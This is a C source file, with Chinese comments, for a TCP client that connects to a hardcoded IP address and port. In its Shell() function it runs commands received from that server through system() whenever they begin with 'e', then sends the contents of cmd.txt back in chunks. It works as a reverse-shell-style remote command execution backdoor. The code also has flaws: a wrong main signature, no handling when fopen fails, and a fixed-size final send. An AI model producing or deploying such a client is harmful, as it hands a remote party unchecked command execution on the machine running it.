#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define BUF_SIZE 1024
#define SIZE 8 //每次发送文件的大小

//服务器信息
int serv_sock;
struct sockaddr_in serv_adr;

//用于select的集合
fd_set reads;
fd_set cpy_reads;
int fd_max;

void error_handling(char *message);
void Shell();

int main(int argc, char *argv)
{

    serv_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    memset(&serv_adr, 0, sizeof(serv_adr));
    serv_adr.sin_family = AF_INET;
    serv_adr.sin_addr.s_addr = inet_addr("100.2.169.8");
    serv_adr.sin_port = htons(9190);

    if (connect(serv_sock, (struct sockaddr *)&serv_adr, sizeof(serv_adr)) == -1)
        error_handling("connect() error\n");
    printf("Connect Ok ServerIp %s \t%d\n", inet_ntoa(serv_adr.sin_addr), ntohs(serv_adr.sin_port));

    FD_ZERO(&reads);
    fd_max = serv_sock;
    FD_SET(0, &reads);
    FD_SET(serv_sock, &reads);

    while (1)
    {
        cpy_reads = reads;
        struct timeval time_out;
        time_out.tv_sec = 1;
        time_out.tv_usec = 0;
        int ret = select(fd_max + 1, &cpy_reads, NULL, NULL, &time_out);

        if (ret == -1)
            error_handling("select() error");
        else if (ret == 0)
            continue;
        else
            Shell();
    }

    return 0;
}

//
void Shell()
{
    char buf[BUF_SIZE];
    if (FD_ISSET(0, &cpy_reads)) //从屏幕读取数据
    {
        memset(buf, 0, BUF_SIZE);
        read(0, buf, BUF_SIZE - 1);
        //write(serv_sock, buf, sizeof(buf));
        write(serv_sock, buf, strlen(buf)); //这里测试用strlen();
    }
    if (FD_ISSET(serv_sock, &cpy_reads)) //接受数据，输出到屏幕
    {
        memset(buf, 0, sizeof(buf));
        read(serv_sock, buf, BUF_SIZE);
        //write(1, &buf[0], 1);
        if (buf[0] == 'e')
        {

            puts(buf);
            int ret = system(buf);
            if (ret < 0)
                printf("system() error\n");

            //发送文件给Server
            FILE *fp;
            int totlen;
            char sendBuf[BUF_SIZE];
            if ((fp = fopen("cmd.txt", "rb")) == NULL)
                puts("fopen() error\n");
            fseek(fp, 0, SEEK_END);
            totlen = ftell(fp);

            //发送文件长度，方便服务器
            memset(sendBuf, 0, sizeof(sendBuf));
            //itoa(totlen, sendBuf, 10);
            sprintf(sendBuf, "%d", totlen);
            ret = send(serv_sock, sendBuf, strlen(sendBuf) + 1, 0);
            //printf("cmd.txt大小%d字节\n", totlen);

            int cnt = totlen / SIZE;
            int len1 = SIZE;
            int lenlast;
            if (totlen % SIZE)
            {
                lenlast = totlen - cnt * SIZE;
                cnt = cnt + 1;
            }
            rewind(fp);
            // int count = 0;
            for (int i = 0; i < cnt - 1; i++)
            {
                fread(sendBuf, SIZE, 1, fp);
                send(serv_sock, sendBuf, SIZE, 0);
                //write(1, buf, strlen(buf));
                memset(sendBuf, 0, sizeof(sendBuf));
                //++count;
            }
            fread(sendBuf, SIZE, 1, fp);
            send(serv_sock, sendBuf, 8, 0);
            //write(1, buf, strlen(buf));
            //printf("发送次数%d\n", ++count);
            fclose(fp);
        }
        else
            write(1, buf, sizeof(buf));
    }
}

void error_handling(char *message)
{
    printf("%s", message);
    exit(0);
}
